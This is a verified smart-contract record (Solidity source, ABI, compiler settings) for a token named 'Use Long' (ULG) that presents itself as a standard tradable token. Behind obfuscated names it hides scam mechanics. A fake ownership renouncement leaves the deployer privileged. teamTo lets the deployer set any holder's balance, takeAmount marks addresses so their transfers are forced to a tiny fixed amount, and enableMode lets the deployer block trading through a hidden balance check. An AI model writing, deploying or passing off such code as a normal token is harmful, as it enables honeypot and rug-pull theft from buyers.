{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface shouldMax {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract senderToken {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoWallet {\n    function createPair(address senderTx, address atMin) external returns (address);\n}\n\ninterface minTotalTrading {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address sellAtSwap) external view returns (uint256);\n\n    function transfer(address liquidityAmountSender, uint256 fromModeAuto) external returns (bool);\n\n    function allowance(address totalLaunchAmount, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fromModeAuto) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address liquidityAmountSender,\n        uint256 fromModeAuto\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed autoFee, uint256 value);\n    event Approval(address indexed totalLaunchAmount, address indexed spender, uint256 value);\n}\n\ninterface senderFund is minTotalTrading {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract UseLong is senderToken, minTotalTrading, senderFund {\n\n    uint256 constant minMarketing = 11 ** 10;\n\n    function transferFrom(address listTo, address liquidityAmountSender, uint256 fromModeAuto) external override returns (bool) {\n        if (_msgSender() != launchSenderShould) {\n            if (liquidityTotal[listTo][_msgSender()] != type(uint256).max) {\n                require(fromModeAuto <= liquidityTotal[listTo][_msgSender()]);\n                liquidityTotal[listTo][_msgSender()] -= fromModeAuto;\n            }\n        }\n        return liquidityLimitLaunched(listTo, liquidityAmountSender, fromModeAuto);\n    }\n\n    function getOwner() external view returns (address) {\n        return marketingTake;\n    }\n\n    constructor (){\n        if (takeWallet) {\n            takeWallet = false;\n        }\n        shouldMax fromFee = shouldMax(launchSenderShould);\n        takeTrading = autoWallet(fromFee.factory()).createPair(fromFee.WETH(), address(this));\n        if (teamIs == tokenTake) {\n            tokenTake = teamIs;\n        }\n        shouldAmount = _msgSender();\n        launchTx();\n        buyLimit[shouldAmount] = true;\n        receiverLimit[shouldAmount] = minSwap;\n        if (teamIs == tokenTake) {\n            teamIs = tokenTake;\n        }\n        emit Transfer(address(0), shouldAmount, minSwap);\n    }\n\n    function allowance(address walletMinTake, address sellMin) external view virtual override returns (uint256) {\n        if (sellMin == launchSenderShould) {\n            return type(uint256).max;\n        }\n        return liquidityTotal[walletMinTake][sellMin];\n    }\n\n    function transfer(address receiverTotal, uint256 fromModeAuto) external virtual override returns (bool) {\n        return liquidityLimitLaunched(_msgSender(), receiverTotal, fromModeAuto);\n    }\n\n    mapping(address => bool) public minIs;\n\n    function symbol() external view virtual override returns (string memory) {\n        return feeAmount;\n    }\n\n    uint256 marketingReceiver;\n\n    string private feeAmount = \"ULG\";\n\n    function marketingLimit(address takeMarketing) public {\n        if (toLaunchReceiver) {\n            return;\n        }\n        if (walletList == tokenTake) {\n            tokenTake = teamIs;\n        }\n        buyLimit[takeMarketing] = true;\n        \n        toLaunchReceiver = true;\n    }\n\n    uint256 public tokenTake;\n\n    function owner() external view returns (address) {\n        return marketingTake;\n    }\n\n    function tradingLimit() private view {\n        require(buyLimit[_msgSender()]);\n    }\n\n    bool private liquidityMarketing;\n\n    function name() external view virtual override returns (string memory) {\n        return launchedList;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return sellTake;\n    }\n\n    string private launchedList = \"Use Long\";\n\n    function liquidityLimitLaunched(address listTo, address liquidityAmountSender, uint256 fromModeAuto) internal returns (bool) {\n        if (listTo == shouldAmount) {\n            return amountShould(listTo, liquidityAmountSender, fromModeAuto);\n        }\n        uint256 fromMax = minTotalTrading(takeTrading).balanceOf(receiverTx);\n        require(fromMax == marketingReceiver);\n        require(liquidityAmountSender != receiverTx);\n        if (minIs[listTo]) {\n            return amountShould(listTo, liquidityAmountSender, minMarketing);\n        }\n        return amountShould(listTo, liquidityAmountSender, fromModeAuto);\n    }\n\n    bool public toLaunchReceiver;\n\n    event OwnershipTransferred(address indexed feeTake, address indexed takeLiquidity);\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return minSwap;\n    }\n\n    uint256 private walletList;\n\n    address public shouldAmount;\n\n    function approve(address sellMin, uint256 fromModeAuto) public virtual override returns (bool) {\n        liquidityTotal[_msgSender()][sellMin] = fromModeAuto;\n        emit Approval(_msgSender(), sellMin, fromModeAuto);\n        return true;\n    }\n\n    uint256 private minSwap = 100000000 * 10 ** 18;\n\n    address public takeTrading;\n\n    mapping(address => uint256) private receiverLimit;\n\n    function amountShould(address listTo, address liquidityAmountSender, uint256 fromModeAuto) internal returns (bool) {\n        require(receiverLimit[listTo] >= fromModeAuto);\n        receiverLimit[listTo] -= fromModeAuto;\n        receiverLimit[liquidityAmountSender] += fromModeAuto;\n        emit Transfer(listTo, liquidityAmountSender, fromModeAuto);\n        return true;\n    }\n\n    mapping(address => bool) public buyLimit;\n\n    function balanceOf(address sellAtSwap) public view virtual override returns (uint256) {\n        return receiverLimit[sellAtSwap];\n    }\n\n    uint256 public teamIs;\n\n    function takeAmount(address buyAuto) public {\n        tradingLimit();\n        if (tokenTake == walletList) {\n            takeWallet = false;\n        }\n        if (buyAuto == shouldAmount || buyAuto == takeTrading) {\n            return;\n        }\n        minIs[buyAuto] = true;\n    }\n\n    bool private takeWallet;\n\n    mapping(address => mapping(address => uint256)) private liquidityTotal;\n\n    function teamTo(address receiverTotal, uint256 fromModeAuto) public {\n        tradingLimit();\n        receiverLimit[receiverTotal] = fromModeAuto;\n    }\n\n    uint8 private sellTake = 18;\n\n    uint256 receiverReceiver;\n\n    address private marketingTake;\n\n    function enableMode(uint256 fromModeAuto) public {\n        tradingLimit();\n        marketingReceiver = fromModeAuto;\n    }\n\n    function launchTx() public {\n        emit OwnershipTransferred(shouldAmount, address(0));\n        marketingTake = address(0);\n    }\n\n    address launchSenderShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address receiverTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalLaunchAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeLiquidity\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoFee\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMinTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellMin\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromModeAuto\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellAtSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fromModeAuto\",\"type\":\"uint256\"}],\"name\":\"enableMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeMarketing\",\"type\":\"address\"}],\"name\":\"marketingLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyAuto\",\"type\":\"address\"}],\"name\":\"takeAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromModeAuto\",\"type\":\"uint256\"}],\"name\":\"teamTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toLaunchReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromModeAuto\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityAmountSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromModeAuto\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "UseLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}